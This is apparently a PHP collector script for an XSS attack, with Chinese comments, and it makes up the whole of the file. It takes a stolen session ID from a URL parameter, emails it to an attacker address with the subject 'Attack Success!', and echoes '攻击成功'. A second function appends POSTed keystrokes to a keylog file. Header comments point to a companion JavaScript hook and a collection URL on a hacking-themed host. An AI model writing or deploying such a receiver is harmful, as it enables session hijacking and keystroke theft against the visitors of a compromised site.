<!--
    // 1. xss_hook2email.js 文件负责外发，xss_hook2email.php 负责接收并发邮件
    https://www.collect.hack.net/xss_hook2email.php?sid=qytang # 接收sid，外发邮件

    // 1. xss_hook2email.js 文件负责外发，xss_hook2email.php 负责接收并发邮件
    https://www.collect.hack.net/xss_hook2email.php?sid=qytang # 接收sid，外发邮件
-->

<?php

// XSS Hook Cookie: Send by email
// https://www.collect.hack.net/xss_hook2email.php?sid=qytang
function send_cookie_email($sid) {
    $to = 'hack_email@hack.com'; // hack email
    $subject = 'Attack Success!'; // email title
    $message = 'Session ID: ' . $sid; // email message
    $additional_headers = 'from: ' . $to;
    mb_send_mail($to, $subject, $message, $additional_headers);
// // }
// // function display_attack_status($sid) {
    // <body>攻击成功<br>
    // <?php echo $sid; ? >
    // </body>
    echo "攻击成功<br>";
    echo $sid;
}
mb_language('ui');
$sid = $_GET['sid'];
send_cookie_email($sid);
// display_attack_status($sid);

// XSS Hook KeyLogger: Write to keylog.txt
// https://www.collect.hack.net/xss_hook2email.php
function write_keylogger() {
    $key = $_POST['key'];
    $logfile = "keylog.txt";
    $fp = fopen($logfile, 'a');
    fwrite($fp, $key);
    fclose($fp);
}

?>

